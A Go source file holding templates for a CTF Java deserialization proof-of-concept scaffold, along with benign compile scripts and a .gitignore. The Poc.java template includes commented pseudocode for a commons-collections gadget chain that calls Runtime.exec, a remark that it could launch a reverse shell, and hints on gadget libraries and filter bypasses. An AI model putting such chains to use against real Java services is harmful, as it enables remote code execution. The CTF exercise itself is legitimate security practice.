// Package generator 生成 pom.xml / Poc.java / README / 脚本 / .gitignore。
//
// 对应 Python create-ctf-poc.py 的 Generator + Template 层。
// 模板内容（Poc.java、compile-run.sh/.bat、.gitignore）逐字复刻，
// 用 Go 反引号原始字符串字面量保存，保证字符级一致。
package generator

// PocJavaTemplate 是反序列化 POC 模板（对应 Python 的 POC_JAVA_TEMPLATE）。
// 逐字复刻，含完整中文注释、getGadget/deserialize/main 方法。
const PocJavaTemplate = `package ctf.poc;

import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.util.Base64;

/**
 * CTF Java 反序列化 POC 模板
 * <p>
 * 由 create-ctf-poc.py 自动生成。本模板已经把反序列化 POC 的常用骨架搭好，
 * 你只需要专注于 {@link #getGadget()} —— 构造利用链 / gadget 链。
 * <p>
 * 思路提示：
 *   1. 用 jd-gui / jadx / CFR 反编译 lib/challenge-classes.jar，定位题目自定义类
 *      （尤其注意 InvocationHandler、equals/hashCode/compare/readObject 等触发点）。
 *   2. 检查 lib/ 下有哪些第三方库可作 gadget：
 *        - commons-collections 3.x        -> CC1/CC6/LazyMap
 *        - commons-collections 4.x        -> CC2/CC4/PriorityQueue
 *        - commons-beanutils              -> BeanComparator
 *        - fastjson / jackson             -> 反序列化触发 JNDI
 *        - shiro                          -> rememberMe AES
 *   3. 如果题目环境存在 SerialKiller / JEP 等反序列化过滤器，需要先绕过黑名单。
 *   4. 生成 payload 后，通常用 base64 编码后通过 HTTP/接口投递，本题可参考
 *      challenge-classes.jar 中的 Controller 寻找入口。
 */
public class Poc {

    /**
     * 构造利用链，返回序列化后的字节数组。
     * <p>
     * TODO: 在这里实现你的 gadget 链。下面给出一个占位实现，
     * 实际使用时替换为真实利用链对象。
     *
     * @return 序列化后的 payload 字节
     * @throws Exception 构造过程中的异常
     */
    public static byte[] getGadget() throws Exception {
        // ====== 在此填充利用链 ======
        // 示例（伪代码，需要根据目标实际依赖改写）：
        //
        //   // 1) 准备恶意 Transformer 链 (commons-collections 3.x)
        //   Transformer[] transformers = new Transformer[] {
        //       new ConstantTransformer(Runtime.class),
        //       new InvokerTransformer("getMethod",
        //           new Class[]{String.class, Class[].class},
        //           new Object[]{"getRuntime", new Class[0]}),
        //       new InvokerTransformer("invoke",
        //           new Class[]{Object.class, Object[].class},
        //           new Object[]{null, new Object[0]}),
        //       new InvokerTransformer("exec",
        //           new Class[]{String.class},
        //           new Object[]{"calc"})  // 或反弹 shell 命令
        //   };
        //   ChainedTransformer chain = new ChainedTransformer(transformers);
        //   Map innerMap = new HashMap();
        //   Map lazyMap = LazyMap.decorate(innerMap, chain);
        //
        //   // 2) 用动态代理 / AnnotationInvocationHandler 等触发
        //   Map outerMap = Map.class.cast(Proxy.newProxyInstance(...));
        //
        //   // 3) 序列化
        //   return serialize(outerMap);

        // 占位：返回空数据，便于先验证编译/运行链路通畅
        return new byte[0];
    }

    /**
     * 把对象序列化为字节数组。
     */
    public static byte[] serialize(Object obj) throws IOException {
        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        try (ObjectOutputStream oos = new ObjectOutputStream(baos)) {
            oos.writeObject(obj);
        }
        return baos.toByteArray();
    }

    /**
     * 反序列化字节数据 —— 模拟题目环境 ObjectInputStream.readObject()。
     * <p>
     * 注意：真实题目可能通过 HTTP/RMI/JMX 等通道投递，本方法用于本地自测
     * gadget 是否能触发。如果题目有反序列化过滤器，可在此处模拟。
     */
    public static Object deserialize(byte[] data) throws IOException, ClassNotFoundException {
        try (ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(data))) {
            return ois.readObject();
        }
    }

    public static void main(String[] args) {
        try {
            // 1) 构造 payload
            byte[] payload = getGadget();
            System.out.println("[*] payload 长度: " + payload.length + " bytes");

            // 2) 输出 base64，便于通过 HTTP 接口投递
            String b64 = Base64.getEncoder().encodeToString(payload);
            System.out.println("[*] payload (base64):");
            System.out.println(b64);

            // 3) 本地自测反序列化（验证 gadget 触发）
            if (payload.length > 0) {
                System.out.println("[*] 本地反序列化测试...");
                Object result = deserialize(payload);
                System.out.println("[+] 反序列化完成: " + result);
            } else {
                System.out.println("[!] payload 为空，请在 getGadget() 中实现利用链");
            }
        } catch (Exception e) {
            // gadget 触发时通常抛异常（如执行命令返回值），属正常现象
            System.out.println("[!] 发生异常（gadget 触发时常见）:");
            e.printStackTrace();
        }
    }
}
`

// CompileRunSH 是 Linux/macOS 一键编译运行脚本（对应 Python 的 COMPILE_RUN_SH）。
// 逐字复刻，含平台分隔符 uname 检测逻辑。
const CompileRunSH = `#!/usr/bin/env bash
# 一键编译并运行 POC（Linux/macOS）
# 由 create-ctf-poc.py 生成
set -e
cd "$(dirname "$0")"

echo "[*] mvn clean compile ..."
mvn -q clean compile

echo "[*] 构建 classpath（包含 system scope 的 lib/）"
# classpath 分隔符：Windows 用 ';'，类 Unix 用 ':'。
# 注意：在 Git Bash 下调用的是 Windows 版 java，仍需 ';'。
SEP=":"
case "$(uname -s)" in
    MINGW*|MSYS*|CYGWIN*) SEP=";" ;;
esac
CP="target/classes"
while IFS= read -r f; do
    CP="$CP$SEP$f"
done < <(find lib -name '*.jar' | sort)

echo "[*] 运行 ctf.poc.Poc ..."
java -Dfile.encoding=UTF-8 -Dstdout.encoding=UTF-8 -cp "$CP" ctf.poc.Poc
`

// CompileRunBAT 是 Windows 一键编译运行脚本（对应 Python 的 COMPILE_RUN_BAT）。
// 含 chcp 65001（让 .bat 自身中文 echo 在 GBK 控制台正确显示）、for 循环 classpath 构造、
// -Dfile.encoding=UTF-8（让 POC 的 System.out 中文在 UTF-8 控制台正确显示）。
// 写入时由 WriteBat 以 UTF-8（无 BOM）+ CRLF 落盘（无 BOM 才不会污染首行命令）。
const CompileRunBAT = `@echo off
chcp 65001 > nul
REM 一键编译并运行 POC（Windows）
REM 由 create-ctf-poc.py 生成
setlocal
cd /d "%~dp0"

echo [*] mvn clean compile ...
call mvn -q clean compile
if errorlevel 1 (
    echo [-] 编译失败
    exit /b 1
)

echo [*] 构建 classpath（包含 system scope 的 lib/）
set CP=target\classes
for %%f in (lib\*.jar) do (
    call set "CP=%%CP%%;%%f"
)

echo [*] 运行 ctf.poc.Poc ...
java -Dfile.encoding=UTF-8 -Dstdout.encoding=UTF-8 -cp "%CP%" ctf.poc.Poc
endlocal
`

// GitignoreContent 是 .gitignore 内容（对应 Python 的 GITIGNORE）。
const GitignoreContent = `# Maven
target/
*.class

# IDE
.idea/
*.iml
.vscode/
.settings/
.project
.classpath

# 构建产物 / 临时
cp.txt
*.log

# 注意：lib/ 目录包含题目依赖，体积较大。
# 默认保留在版本控制中以便直接编译；如不需要可取消下一行注释。
# lib/
`
